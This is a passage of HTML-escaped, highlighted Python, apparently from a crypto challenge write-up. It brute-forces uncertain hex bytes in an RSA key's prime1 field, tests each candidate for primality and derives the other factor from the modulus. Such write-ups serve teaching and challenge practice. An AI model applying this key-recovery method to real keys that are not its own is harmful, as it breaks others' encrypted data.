    &lt;span class=&quot;n&quot;&gt;pos_7f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;positions_occ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;new_7f_0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'7f'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'fb'&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;new_7f_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'7f'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'fb'&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;new_7f_2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'7f'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'fb'&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;new_7f_3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'7f'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'fb'&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_7f_0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_7f_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_7f_2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_7f_3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;# adapt 'f4'
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_f4&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;combinaisons_f4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pos_f4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;positions_occ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;new_f4_0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'f4'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_f4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'12'&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_f4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_f4_0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_f4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
        
        &lt;span class=&quot;c1&quot;&gt;# adapt '16'
&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_16&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;combinaisons_16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;pos_16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;positions_occ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;new_16_0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'16'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'54'&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_16_0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
            
            &lt;span class=&quot;c1&quot;&gt;# adapt 'a4'
&lt;/span&gt;            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_a4&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;combinaisons_a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;pos_a4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;positions_occ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;new_a4_0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'a4'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'57'&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;new_a4_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'a4'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'57'&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;new_a4_2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'a4'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'57'&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_a4_0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_a4_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_a4_2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
                	
                    &lt;span class=&quot;c1&quot;&gt;# adapt 'b5'
&lt;/span&gt;                &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_b5&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;combinaisons_b5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;pos_b5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;positions_occ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;new_b5_0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'b5'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_b5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'cd'&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;new_b5_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'b5'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c_b5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'cd'&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_b5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_b5_0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_b5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_b5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_b5_1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos_b5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;

                    &lt;span class=&quot;c1&quot;&gt;# final test
&lt;/span&gt;                    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'prime1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gmpy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_prime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gmpy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_prime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
